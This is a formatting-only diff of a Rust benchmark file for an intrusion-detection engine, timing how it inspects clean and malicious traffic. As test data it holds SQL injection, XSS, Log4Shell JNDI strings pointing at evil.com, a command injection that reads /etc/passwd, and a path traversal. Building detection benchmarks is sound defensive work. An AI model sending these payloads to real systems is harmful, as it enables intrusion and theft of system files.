@@ -6,8 +6,8 @@
 //! - Payload size scaling
 
 use criterion::{black_box, criterion_group, criterion_main, BenchmarkId, Criterion, Throughput};
-use std::net::{IpAddr, Ipv4Addr};
 use ids_engine::{config::IdsConfig, engine::IdsEngine};
+use std::net::{IpAddr, Ipv4Addr};
 
 fn make_engine() -> IdsEngine {
     IdsEngine::new(IdsConfig::default()).expect("Failed to create IDS engine")
@@ -23,7 +23,7 @@ fn bench_clean_payloads(c: &mut Criterion) {
     let mut group = c.benchmark_group("ids_clean");
     group.throughput(Throughput::Elements(1));
 
-// Empty payload
+    // Empty payload
     group.bench_function("empty", |b| {
         b.iter(|| {
             engine.inspect(
@@ -35,7 +35,7 @@ fn bench_clean_payloads(c: &mut Criterion) {
         })
     });
 
-// Small HTTP GET
+    // Small HTTP GET
     let http_get = b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n";
     group.bench_function("http_get_small", |b| {
         b.iter(|| {
@@ -48,7 +48,7 @@ fn bench_clean_payloads(c: &mut Criterion) {
         })
     });
 
-// Medium HTTP response
+    // Medium HTTP response
     let http_response = format!(
         "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\n\r\n{}",
         1000,
@@ -65,7 +65,7 @@ fn bench_clean_payloads(c: &mut Criterion) {
         })
     });
 
-// SMTP EHLO
+    // SMTP EHLO
     let smtp_ehlo = b"EHLO mail.example.com\r\n";
     group.bench_function("smtp_ehlo", |b| {
         b.iter(|| {
@@ -91,8 +91,9 @@ fn bench_malicious_payloads(c: &mut Criterion) {
     let mut group = c.benchmark_group("ids_malicious");
     group.throughput(Throughput::Elements(1));
 
-// SQL Injection in HTTP
-    let sql_payload = b"GET /search?q=' UNION SELECT * FROM users -- HTTP/1.1\r\nHost:example.com\r\n\r\n";
+    // SQL Injection in HTTP
+    let sql_payload =
+        b"GET /search?q=' UNION SELECT * FROM users -- HTTP/1.1\r\nHost:example.com\r\n\r\n";
     group.bench_function("sqli_http", |b| {
         b.iter(|| {
             engine.inspect(
@@ -104,7 +105,7 @@ fn bench_malicious_payloads(c: &mut Criterion) {
         })
     });
 
-// XSS in HTTP
+    // XSS in HTTP
     let xss_payload = b"POST /comment HTTP/1.1\r\nHost: example.com\r\nContent-Length: 30\r\n\r\n<script>alert(1)</script>";
     group.bench_function("xss_http", |b| {
         b.iter(|| {
@@ -117,8 +118,9 @@ fn bench_malicious_payloads(c: &mut Criterion) {
         })
     });
 
-// Log4Shell
-    let log4shell = b"GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: ${jndi:ldap://evil.com/x}\r\n\r\n";
+    // Log4Shell
+    let log4shell =
+        b"GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: ${jndi:ldap://evil.com/x}\r\n\r\n";
     group.bench_function("log4shell", |b| {
         b.iter(|| {
             engine.inspect(
@@ -130,8 +132,9 @@ fn bench_malicious_payloads(c: &mut Criterion) {
         })
     });
 
-// Shell command
-    let cmd_payload = b"GET /ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1\r\nHost: example.com\r\n\r\n";
+    // Shell command
+    let cmd_payload =
+        b"GET /ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1\r\nHost: example.com\r\n\r\n";
     group.bench_function("command_injection", |b| {
         b.iter(|| {
             engine.inspect(
@@ -143,7 +146,7 @@ fn bench_malicious_payloads(c: &mut Criterion) {
         })
     });
 
-// Path traversal
+    // Path traversal
     let traversal = b"GET /../../../etc/passwd HTTP/1.1\r\nHost: example.com\r\n\r\n";
     group.bench_function("path_traversal", |b| {
         b.iter(|| {
@@ -171,29 +174,33 @@ fn bench_size_scaling(c: &mut Criterion) {
     let sizes = [100, 1_000, 10_000, 100_000];
 
     for size in sizes {
-// Create a clean payload of specified size
+        // Create a clean payload of specified size
         let payload = vec![b'x'; size];
 
         group.throughput(Throughput::Bytes(size as u64));
-        group.bench_with_input(BenchmarkId::new("clean_bytes", size), &payload, |b, payload| {
-            b.iter(|| {
-                engine.inspect(
-                    black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
-                    black_box(80),
-                    black_box("tcp"),
-                    black_box(payload),
-                )
-            })
-        });
+        group.bench_with_input(
+            BenchmarkId::new("clean_bytes", size),
+            &payload,
+            |b, payload| {
+                b.iter(|| {
+                    engine.inspect(
+                        black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
+                        black_box(80),
+                        black_box("tcp"),
+                        black_box(payload),
+                    )
+                })
+            },
+        );
     }
 
-// Malicious patterns at different positions
+    // Malicious patterns at different positions
     for size in [1_000, 10_000, 50_000] {
-// Malicious at start
+        // Malicious at start
         let mut payload_start = b"${jndi:ldap://a.b/x}".to_vec;
         payload_start.extend(vec![b'x'; size]);
 
-// Malicious at end
+        // Malicious at end
         let mut payload_end = vec![b'x'; size];
         payload_end.extend(b"${jndi:ldap://a.b/x}");
 
@@ -277,7 +284,7 @@ fn bench_binary_payloads(c: &mut Criterion) {
     let mut group = c.benchmark_group("ids_binary");
     group.throughput(Throughput::Elements(1));
 
-// All zeros
+    // All zeros
     let zeros: Vec<u8> = vec![0u8; 1000];
     group.bench_function("all_zeros_1kb", |b| {
         b.iter(|| {
@@ -290,7 +297,7 @@ fn bench_binary_payloads(c: &mut Criterion) {
         })
     });
 
-// Random-ish binary (repeating pattern)
+    // Random-ish binary (repeating pattern)
     let pattern: Vec<u8> = (0..=255u8).cycle().take(1000).collect();
     group.bench_function("binary_pattern_1kb", |b| {
         b.iter(|| {
@@ -303,7 +310,7 @@ fn bench_binary_payloads(c: &mut Criterion) {
         })
     });
 
-// PE header (Windows executable magic)
+    // PE header (Windows executable magic)
     let mut pe_like = vec![0x4D, 0x5A]; // MZ header
     pe_like.extend(vec![0u8; 998]);
     group.bench_function("pe_like_1kb", |b| {
